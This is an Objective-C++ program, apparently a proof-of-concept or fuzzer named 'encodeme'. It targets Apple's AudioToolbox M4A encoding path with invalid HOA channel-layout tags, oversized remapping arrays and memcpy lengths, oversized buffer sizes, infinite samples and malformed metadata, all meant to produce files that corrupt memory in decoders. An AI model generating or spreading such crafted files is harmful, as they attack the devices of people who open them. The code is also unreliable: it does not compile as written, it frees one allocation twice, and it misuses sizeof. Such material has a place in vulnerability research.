@import AVFAudio;
@import AudioToolbox;
#include <vector>
#include <random>
#include <stdio.h>

struct CodecConfig {
  char padding0[0x78];
  AudioChannelLayout* remappingChannelLayout;
  char padding1[0xe0 - 0x80];
  std::vector<char> mRemappingArray;

  CodecConfig() : remappingChannelLayout(nullptr) {}
  ~CodecConfig() {
    if (remappingChannelLayout) {
      free(remappingChannelLayout);
    }
  }
};

void OverrideApac(CodecConfig* config) {
  if (config->remappingChannelLayout) {
    // Intentionally set invalid channel layout tag for fuzzing
    config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | (rand() % 0x10);
    fprintf(stderr, "Set channel layout tag to 0x%x\n", config->remappingChannelLayout->mChannelLayoutTag);
  }
  config->mRemappingArray.resize(1024 + (rand() % 1024), 0xff); // Oversized array
}

int main() {
  fprintf(stderr, "Starting encodeme at %s", ctime(&time(nullptr)));
  std::vector<double> sampleRates = {16000, 44100, 48000, 96000};
  std::vector<AudioFormatID> formats = {kAudioFormatMPEG4AAC, kAudioFormatLinearPCM};
  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_int_distribution<> formatDist(0, formats.size() - 1);

  for (double sampleRate : sampleRates) {
    AudioFormatID formatID = formats[formatDist(gen)];
    fprintf(stderr, "Processing sample rate %.0f, format %u\n", sampleRate, formatID);
    if (formatID == kAudioFormatMPEG4AAC && sampleRate < 16000) {
      fprintf(stderr, "Skipping unsupported sample rate %.0f for AAC\n", sampleRate);
      continue;
    }
    uint32_t channelNum = 4 + (rand() % 8); // Random channels (4–11) for fuzzing
    AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:sampleRate channels:channelNum];
    if (!formatIn) {
      fprintf(stderr, "Failed to create AVAudioFormat for rate %.0f\n", sampleRate);
      continue;
    }

    AudioStreamBasicDescription outputDescription = {
        .mSampleRate = sampleRate,
        .mFormatID = formatID,
        .mFormatFlags = (formatID == kAudioFormatLinearPCM) ? kAudioFormatFlagIsFloat | kAudioFormatFlagIsPacked : 0,
        .mBytesPerPacket = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : 0,
        .mFramesPerPacket = static_cast<UInt32>((formatID == kAudioFormatMPEG4AAC) ? 1024 : 1),
        .mBytesPerFrame = (formatID == kAudioFormatLinearPCM) ? 4 * channelNum : 0,
        .mChannelsPerFrame = channelNum,
        .mBitsPerChannel = static_cast<UInt32>((formatID == kAudioFormatLinearPCM) ? 32 : 0),
        .mReserved = 0
    };

    AVAudioChannelLayout* channelLayout = [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3];
    if (!channelLayout || !channelLayout.layout) {
      fprintf(stderr, "Failed to create channel layout for rate %.0f\n", sampleRate);
      continue;
    }

    CodecConfig config;
    size_t layoutSize = sizeof(AudioChannelLayout) + sizeof(AudioChannelDescription) * (channelNum + (rand() % 10)); // Oversized layout
    AudioChannelLayout* channelLayoutCopy = (AudioChannelLayout*)calloc(1, layoutSize);
    if (!channelLayoutCopy) {
      fprintf(stderr, "Memory allocation failed for channel layout, rate %.0f\n", sampleRate);
      continue;
    }
    memcpy(channelLayoutCopy, channelLayout.layout, layoutSize); // Potential overflow
    config.remappingChannelLayout = channelLayoutCopy;
    fprintf(stderr, "Allocated and copied channel layout for rate %.0f\n", sampleRate);

    OverrideApac(&config);

    NSString* fileName = [NSString stringWithFormat:@"output_%.0f_%u.m4a", sampleRate, formatID];
    NSURL* outUrl = [NSURL fileURLWithPath:fileName];
    fprintf(stderr, "Creating file: %s\n", fileName.UTF8String);

    ExtAudioFileRef audioFile = nullptr;
    OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileM4AType,
                                                &outputDescription, config.remappingChannelLayout,
                                                kAudioFileFlags_EraseFile, &audioFile);
    if (status != noErr) {
      fprintf(stderr, "Error creating file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
      free(channelLayoutCopy);
      continue;
    }

    // Add malformed metadata
    NSDictionary *metadata = @{@"com.apple.metadata.spatial" : @(rand() % 0xFFFF)};
    AudioFileSetProperty(audioFile, kAudioFilePropertyInfoDictionary, sizeof(metadata), &metadata);

    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                     sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
    if (status != noErr) {
      fprintf(stderr, "Error setting client data format (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
      ExtAudioFileDispose(audioFile);
      free(channelLayoutCopy);
      continue;
    }

    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                     layoutSize, formatIn.channelLayout.layout);
    if (status != noErr) {
      fprintf(stderr, "Error setting client channel layout (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
      ExtAudioFileDispose(audioFile);
      free(channelLayoutCopy);
      continue;
    }

    float* audioBuffer = new float[44100 * channelNum];
    if (!audioBuffer) {
      fprintf(stderr, "Failed to allocate audio buffer for rate %.0f\n", sampleRate);
      ExtAudioFileDispose(audioFile);
      free(channelLayoutCopy);
      continue;
    }
    std::uniform_real_distribution<float> dis(-10.0f, 10.0f);
    for (size_t i = 0; i < 44100 * channelNum; ++i) {
      audioBuffer[i] = dis(gen);
      if (rand() % 100 < 10) {
        audioBuffer[i] = std::numeric_limits<float>::infinity(); // Invalid samples
      }
    }
    fprintf(stderr, "Filled audio buffer for rate %.0f\n", sampleRate);

    AudioBufferList audioBufferList = {
        .mNumberBuffers = 1,
        .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000)), .mData = audioBuffer}}, // Oversized buffer
    };
    status = ExtAudioFileWrite(audioFile, 44100, &audioBufferList);
    if (status != noErr) {
      fprintf(stderr, "Error writing audio (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
    }

    status = ExtAudioFileDispose(audioFile);
    if (status != noErr) {
      fprintf(stderr, "Error disposing file (rate %.0f, format %u): %x\n", sampleRate, formatID, status);
    }

    delete[] audioBuffer;
    free(channelLayoutCopy);
    fprintf(stderr, "Completed processing for rate %.0f\n", sampleRate);
  }
  fprintf(stderr, "encodeme completed at %s", ctime(&time(nullptr)));
  return 0;
}
